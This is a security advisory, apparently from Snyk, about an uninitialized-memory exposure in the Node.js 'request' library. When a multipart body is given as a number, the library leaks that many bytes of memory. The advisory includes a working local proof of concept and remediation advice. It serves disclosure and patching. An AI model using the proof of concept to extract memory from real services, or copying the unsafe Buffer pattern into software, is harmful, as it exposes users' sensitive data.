## Overview
A potential remote memory exposure vulnerability exists in `request`. If a `request` uses a multipart attachment and the _body type_ option is `number` with value X, then X bytes of uninitialized memory will be sent in the body of the request.

Note that while the impact of this vulnerability is high (memory exposure), exploiting it is likely difficult, as the attacker needs to somehow control the body type of the request. One potential exploit scenario is when a request is composed based on JSON input, including the body type, allowing a malicious JSON to trigger the memory leak.

### Details
Constructing a `Buffer` class with integer `N` creates a `Buffer`
of length `N` with non zero-ed out memory.
**Example:**
```
var x = new Buffer(100); // uninitialized Buffer of length 100
// vs
var x = new Buffer('100'); // initialized Buffer with value of '100'
```

Initializing a multipart body in such manner will cause uninitialized memory to be sent in the body of the request.

#### Proof of concept
```javascript
var http = require('http')
var request = require('request')

http.createServer(function (req, res) {
  var data = ''
  req.setEncoding('utf8')
  req.on('data', function (chunk) {
    console.log('data')
    data += chunk
  })
  req.on('end', function () {
    // this will print uninitialized memory from the client
    console.log('Client sent:\n', data)
  })
  res.end()
}).listen(8000)

request({
  method: 'POST',
  uri: 'http://localhost:8000',
  multipart: [{ body: 1000 }]
},
function (err, res, body) {
  if (err) return console.error('upload failed:', err)
  console.log('sent')
})
```

## Remediation
Upgrade `request` to version 2.68.0 or higher.

If a direct dependency update is not possible, use [`snyk wizard`](https://snyk.io/documentation/#wizard) to patch this vulnerability.

## References
- https://github.com/request/request/pull/2018
- https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md#previous-materials
- https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md
